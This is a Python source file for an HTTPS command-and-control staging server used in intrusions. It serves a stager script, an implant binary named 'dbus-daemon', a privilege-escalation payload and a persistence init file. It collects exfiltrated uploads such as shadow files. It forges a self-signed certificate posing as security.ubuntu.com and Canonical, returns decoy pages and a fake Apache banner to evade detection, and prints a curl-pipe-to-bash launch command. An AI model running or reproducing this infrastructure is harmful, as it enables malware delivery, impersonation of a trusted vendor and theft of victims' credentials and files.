#!/usr/bin/env python3
"""
HTTPS staging server.
  GET /s  - serves stager.sh with STAGING_HOST baked in
  GET /b  - serves the compiled implant binary
  all other paths return a generic 200 to avoid fingerprinting
"""
import datetime
import os
import ssl
import struct
import tempfile
from http.server import BaseHTTPRequestHandler, HTTPServer

STAGING_DIR = os.environ.get("STAGING_DIR", "/srv")
STAGING_HOST = os.environ.get("STAGING_HOST", "127.0.0.1")
PORT = int(os.environ.get("STAGING_PORT", "8443"))
EXFIL_DIR = os.environ.get("EXFIL_DIR", "/app/exfil")


def _make_tls_context():
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa

    priv = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, u"security.ubuntu.com"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Canonical Ltd."),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(priv.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .sign(priv, hashes.SHA256())
    )
    cf = tempfile.NamedTemporaryFile(delete=False, suffix=".crt")
    kf = tempfile.NamedTemporaryFile(delete=False, suffix=".key")
    cf.write(cert.public_bytes(serialization.Encoding.PEM))
    kf.write(priv.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ))
    cf.close()
    kf.close()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cf.name, kf.name)
    os.unlink(cf.name)
    os.unlink(kf.name)
    return ctx


# Generic response for unknown paths - looks like a plain web server, not a file share
_DECOY_BODY = b"<html><body><h1>200 OK</h1></body></html>"


class _Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        # minimal log - don't print full paths to stdout
        print("[staging] {0} {1}".format(self.address_string(), args[0] if args else ""))

    def do_GET(self):
        if self.path in ("/s", "/updates"):
            self._serve_stager()
        elif self.path in ("/b", "/pkg"):
            self._serve_binary()
        elif self.path == "/privesc":
            self._serve_file("privesc", "application/octet-stream")
        elif self.path == "/initd":
            self._serve_file("initd", "text/plain")
        else:
            self._serve_decoy()

    def do_POST(self):
        if self.path.startswith("/u"):
            self._recv_exfil()
        else:
            self._serve_decoy()

    def _serve_file(self, filename, ctype):
        path = os.path.join(STAGING_DIR, filename)
        try:
            with open(path, "rb") as fh:
                content = fh.read()
            self._respond(200, ctype, content)
        except Exception as exc:
            print("[staging] file read error ({0}): {1}".format(filename, exc))
            self._respond(500, "text/plain", b"error")

    def _recv_exfil(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length)
            # filename from query string e.g. /u?filename=shadow
            filename = "upload"
            if "?" in self.path:
                qs = self.path.split("?", 1)[1]
                for part in qs.split("&"):
                    if part.startswith("filename="):
                        filename = part.split("=", 1)[1].replace("/", "_")
            import time
            out_path = os.path.join(EXFIL_DIR, "{0}_{1}".format(
                int(time.time()), filename))
            os.makedirs(EXFIL_DIR, exist_ok=True)
            with open(out_path, "wb") as fh:
                fh.write(data)
            print("[staging] exfil saved: {0} ({1} bytes)".format(out_path, len(data)))
            self._respond(200, "text/plain", b"ok")
        except Exception as exc:
            print("[staging] exfil error: {0}".format(exc))
            self._respond(500, "text/plain", b"error")

    def _serve_stager(self):
        path = os.path.join(STAGING_DIR, "stager.sh")
        try:
            with open(path, "rb") as fh:
                raw = fh.read()
            # Substitute placeholder IP with the real STAGING_HOST at serve time
            content = raw.replace(b"192.168.1.100", STAGING_HOST.encode())
            self._respond(200, "text/plain", content)
        except Exception as exc:
            print("[staging] stager read error: {0}".format(exc))
            self._respond(500, "text/plain", b"error")

    def _serve_binary(self):
        path = os.path.join(STAGING_DIR, "dbus-daemon")
        try:
            with open(path, "rb") as fh:
                content = fh.read()
            self._respond(200, "application/octet-stream", content)
        except Exception as exc:
            print("[staging] binary read error: {0}".format(exc))
            self._respond(500, "text/plain", b"error")

    def _serve_decoy(self):
        self._respond(200, "text/html", _DECOY_BODY)

    def _respond(self, code, ctype, body):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    ctx = _make_tls_context()
    server = HTTPServer(("0.0.0.0", PORT), _Handler)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    print("[staging] HTTPS on 0.0.0.0:{0}  STAGING_HOST={1}".format(PORT, STAGING_HOST))
    print("[staging]   curl -fsSLk https://{0}/s | bash".format(STAGING_HOST))
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[staging] stopped.")
